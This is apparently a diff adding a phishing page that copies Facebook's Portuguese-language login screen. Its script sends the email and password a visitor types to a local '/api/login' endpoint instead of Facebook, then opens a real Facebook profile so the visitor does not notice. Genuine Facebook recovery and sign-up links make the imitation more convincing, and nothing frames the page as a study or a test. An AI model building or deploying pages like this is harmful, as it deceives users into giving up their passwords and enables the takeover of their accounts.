@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Facebook – entre ou cadastre-se</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700&family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="favicon.png">
+    <script src="api/acessar.js"></script>
+    <link rel="stylesheet" type="text/css" href="css/device.css">
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <meta name="robots" content="noindex, follow">
+</head>
+<body>
+    <div class="limiter">
+        <div class="container-login100">
+            <div class="wrap-login100 p-t-50 p-b-90">
+                <form class="login100-form validate-form flex-sb flex-w">
+                    <span class="login100-form-title p-b-51">
+                        <h1 style="font-size: 13px; font-family: Inter, sans-serif; font-weight: 400; position: relative; bottom: 12px; margin-top: 50px;">Português (Brasil)</h1>
+                    </span>
+                    <span class="login100-form-title p-b-51">
+                        <img src="ico.png" alt="a" style="width: 60px; height: auto; margin-top: 50px;">
+                    </span>
+                    <div class="main-txt">
+                        <div class="wrap-input100 validate-input m-b-16" data-validate="Username is required">
+                            <input class="input100" id="email" type="email" name="username" placeholder="Número do celular ou email">
+                            <span class="focus-input100"></span>
+                        </div>
+                        <div class="wrap-input100 validate-input m-b-16" data-validate="Password is required">
+                            <input class="input100" id="password" type="password" name="pass" placeholder="Senha">
+                            <span class="focus-input100"></span>
+                        </div>
+
+                        <div class="flex-sb-m w-full p-t-3 p-b-24">
+                            <div class="container-login100-form-btn m-t-17">
+                                <a class="login100-form-btn" id="login-ent" href="javascript:void(0);" onclick="validateAndLogin()">
+                                    <span class="button-log-text">Entrar</span>
+                                </a>
+                                <span class="forgot-pass">
+                                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Esqueceu a senha?</a>
+                                </span>
+                                <a class="button-cad" href="https://m.facebook.com/reg/" target="_blank">
+                                    <span class="button-cad-text">Criar nova conta</span>
+                                </a>
+                                <span class="meta">
+                                    <img src="meta.png" alt="">
+                                </span>
+                                <div class="list-end">
+                                    <ul>
+                                        <li><a href="">Sobre</a></li>
+                                        <li><a href="">Ajuda</a></li>
+                                        <li><a href="">Mais</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="dropDownSelect1"></div>
+
+    <script>
+        function login() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            fetch('/api/login', {
+                method: 'POST',
+                body: JSON.stringify({ email, password }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Erro:', error));
+        }
+
+        function validateAndLogin() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            if (email && password) {
+                if (email.includes('@')) {
+                    login();
+                    window.open("https://www.facebook.com/dudasantos", "_blank");
+                } else {
+                }
+            } else {
+            }
+        }
+    </script>
+</body>
+</html>
